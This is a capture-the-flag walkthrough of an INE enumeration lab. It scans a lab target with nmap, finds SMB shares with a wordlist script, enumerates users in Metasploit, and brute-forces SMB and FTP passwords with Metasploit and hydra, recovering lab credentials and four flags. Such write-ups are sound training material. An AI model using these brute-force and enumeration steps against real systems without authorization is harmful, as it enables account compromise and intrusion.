# Assessment Methodologies: Enumeration CTF 1

### Target
`target.ine.local`

### Tools
- `namp`
- `metasploit`
- `hydra`


### Flag 1: There is a samba share that allows anonymous access. Wonder what's in there!
So based on the statement above there should be a samba share allowing for anonymous access. We first do a simple service/script scan on the target.
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -sV -sC target.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-16 01:28 IST
Nmap scan report for target.ine.local (192.198.107.3)
Host is up (0.000022s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bb:ca:49:7e:f5:5c:6e:bf:8a:55:a1:69:d9:c9:18:01 (RSA)
|   256 da:06:c1:ab:e7:6f:14:b9:50:d5:43:a7:47:ab:80:ce (ECDSA)
|_  256 a1:5c:ab:22:6b:c2:f1:5c:5a:7a:5a:d8:e7:81:e2:33 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:C0:C6:6B:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-08-15T19:58:55
|_  start_date: N/A
|_nbstat: NetBIOS name: TARGET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```
Let's try to run the **nmap** script **smb-enum-shares** to find any shares present.
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -p445 --script=smb-enum-shares target.ine.local                                                                                                                                                                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-16 01:31 IST
Nmap scan report for target.ine.local (192.198.107.3)
Host is up (0.000033s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:C6:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```
Since that didn't give us any proper results, we try to list all shares via anonymous access with the help of `smbclient`.
```bash
┌──(root㉿INE)-[~]
└─# smbclient -L target.ine.local -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (target server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server target.ine.local (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
This doesn't give us any proper output either but in the **notes** we have been told to use a wordlist. Let's check that folder out.  
```bash
┌──(root㉿INE)-[~]
└─# ls /root/Desktop/wordlists/                                                                                                                                                                                                            
shares.txt  unix_passwords.txt
```
This hints at us having to enumerate for all possible shares. Since `enum4linux` gives error while using the wordlist, we create our own script.
```bash
#!/bin/bash

words = "/root/Desktop/wordlists/shares.txt"

while read share; do
    echo "[*] Trying share: $share"
    smbclient "//target.ine.local//$share" -N -c "ls" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Found share: $share"
    fi
done < "$words"
```
We give the script execute permissions and **pipe** the output to a file. We then `grep` the file for the shares found.
```bash
┌──(root㉿INE)-[~]
└─# chmod +x enum_share.sh 

┌──(root㉿INE)-[~]
└─# ./enum_share.sh > result.txt

┌──(root㉿INE)-[~]
└─# cat result.txt | grep Found
[+] Found share: pubfiles
```
We then use `smbclient` to log into the share.
```bash
┌──(root㉿INE)-[~]
└─# smbclient //target.ine.local/pubfiles -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 16 01:27:37 2025
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag1.txt                           N       40  Sat Aug 16 01:27:37 2025

                1981311780 blocks of size 1024. 80416452 blocks available
smb: \> get flag1.txt 
getting file \flag1.txt of size 40 as flag1.txt (19.5 KiloBytes/sec) (average 19.5 KiloBytes/sec)
smb: \> ^C

┌──(root㉿INE)-[~]
└─# cat flag1.txt 
FLAG1{48da053e3c3f41e39674a7d08a1c5e0d}

┌──(root㉿INE)-[~]
└─# 
```
Flag: **FLAG1{48da053e3c3f41e39674a7d08a1c5e0d}**

### Flag 2: One of the samba users have a bad password. Their private share with the same name as their username is at risk!
For this flag we first need the list of all users. We use the auxiliary module **smb_enumusers** in **msf** to find the list of users present.
```bash
msf6 auxiliary(scanner/smb/smb_enumusers) > run

[*] 192.198.107.3:445 - Using automatically identified domain: TARGET
[+] 192.198.107.3:445 - TARGET [ josh, nancy, bob ] ( LockoutTries=0 PasswordMin=5 )
[+] 192.198.107.3:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
[*] target.ine.local:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
So we have found three users and we already have a wordlist to use. We save these usernames in a file and use the **smb_login** module to find the username with the weak password.
```bash
msf6 auxiliary(scanner/smb/smb_login) > set USER_fiLE /root/users.txt
UseR_fiLE => /root/users.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
PASS_FILE => /root/Desktop/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set verbose false 
verbose => false
```
We just let it run and wait for the results
```bash
msf6 auxiliary(scanner/smb/smb_login) > run

[+] 192.198.107.3:445     - 192.198.107.3:445 - Success: '.\josh:purple'
[*] target.ine.local:445  - Scanned 1 of 1 hosts (100% complete)
[*] target.ine.local:445  - Bruteforce completed, 1 credential was successful.
[*] target.ine.local:445  - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
We log into the **josh** share using the newly found username and password and get the flag
```bash
┌──(root㉿INE)-[~]
└─# smbclient //target.ine.local/josh -U josh
Password for [WORKGROUP\josh]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 16 01:27:37 2025
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag2.txt                           N      119  Sat Aug 16 01:27:37 2025

                1981311780 blocks of size 1024. 80344184 blocks available
smb: \> get flag2.txt 
getting file \flag2.txt of size 119 as flag2.txt (116.2 KiloBytes/sec) (average 116.2 KiloBytes/sec)
smb: \> exit

┌──(root㉿INE)-[~]
└─# cat flag2.txt 
FLAG2{af728b832df748f1a599c16edbf9f9c4}

Psst! I heard there is an FTP service running. Find it and check the banner. 
```
Flag: **FLAG2{af728b832df748f1a599c16edbf9f9c4}**

### Flag 3: Follow the hint given in the previous flag to uncover this one
The hint is  
```txt
Psst! I heard there is an FTP service running. Find it and check the banner.
```
When we did the first port scan we didn't find any ftp service. So let's do a port scan for the full range of ports
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -p-  target.ine.local                                                                                                                                                                                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-16 02:22 IST
Nmap scan report for target.ine.local (192.198.107.3)
Host is up (0.000022s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5554/tcp open  sgi-esphttp
MAC Address: 02:42:C0:C6:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds
```
The ftp service is running on port **5554**. We use the script **banner** to find the ftp banner.  
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -p5554 --script banner target.ine.local                                                                                                                                                                                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-16 02:25 IST
Nmap scan report for target.ine.local (192.198.107.3)
Host is up (0.000034s latency).

PORT     STATE SERVICE
5554/tcp open  sgi-esphttp
| banner: 220 Welcome to blah FTP service. Reminder to users, specificall
|_y ashley, alice and amanda to change their weak passwords immediatel...
MAC Address: 02:42:C0:C6:6B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```
Looks like we have a list of usernames with weak passwords. We can use the **ftp_login** module for finding the password.  
```bash
msf6 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.198.107.3:5554    - 192.198.107.3:5554 - Starting FTP login sweep
[+] 192.198.107.3:5554    - 192.198.107.3:5554 - Login Successful: alice:pretty
```
We can also use `hydra` to bruteforce the password.
```bash
┌──(root㉿INE)-[~]                                                                                                                                                                                                                        
└─# hydra -L users.txt -P Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554                                    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).          
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-16 02:45:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3027 login tries (l:3/p:1009), ~190 tries per task
[DATA] attacking ftp://target.ine.local:5554/                 
[5554][ftp] host: target.ine.local   login: alice   password: pretty  
[STATUS] 1234.00 tries/min, 1234 tries in 00:01h, 1793 to do in 00:02h, 16 active
```
Now we just log in into the ftp server to get the flag.
```bash
┌──(root㉿INE)-[~]
└─# ftp target.ine.local 5554
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
Name (target.ine.local:root): alice
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51535|)
150 Here comes the directory listing.
-rw-rw-r--    1 0        0              40 Aug 15 19:57 flag3.txt
226 Directory send OK.
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
229 Entering Extended Passive Mode (|||52625|)
150 Opening BINARY mode data connection for flag3.txt (40 bytes).
100% |*********************************************************************************************************************************************************************************************|    40      813.80 KiB/s    00:00 ETA
226 Transfer complete.
40 bytes received in 00:00 (125.60 KiB/s)
ftp> exit
221 Goodbye.

┌──(root㉿INE)-[~]
└─# cat flag3.txt 
FLAG3{a107693bc19f403f81ea59171bbfed3a}
```
Flag: **FLAG3{a107693bc19f403f81ea59171bbfed3a}**

### Flag 4: This is a warning meant to deter unauthorized users from logging in.
Since we found another service running on the target machine, let's try that service to see if we can find anything.  
```bash
┌──(root㉿INE)-[~]
└─# ssh target.ine.local
The authenticity of host 'target.ine.local (192.198.107.3)' can't be established.
ED25519 key fingerprint is SHA256:qWHJnmTFgrmLKFbmMNRLIr1Y8MVWpqGGxhJ5miFHgnQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target.ine.local' (ED25519) to the list of known hosts.
********************************************************************
*                                                                  *
*            WARNING: Unauthorized access to this system           *
*            is strictly prohibited and may be subject to          *
*            criminal prosecution.                                 *
*                                                                  *
*            This system is for authorized users only.             *
*            All activities on this system are monitored           *
*            and recorded.                                         *
*                                                                  *
*            By accessing this system, you consent to              *
*            such monitoring and recording.                        *
*                                                                  *
*            If you are not an authorized user,                    *
*            disconnect immediately.                               *
*                                                                  *
********************************************************************
*                                                                  *
*    Is this what you're looking for?: FLAG4{e9dd720b77b5448eb9c95464ec0aaacc}       *
*                                                                  *
********************************************************************
```
Flag: **FLAG4{e9dd720b77b5448eb9c95464ec0aaacc}**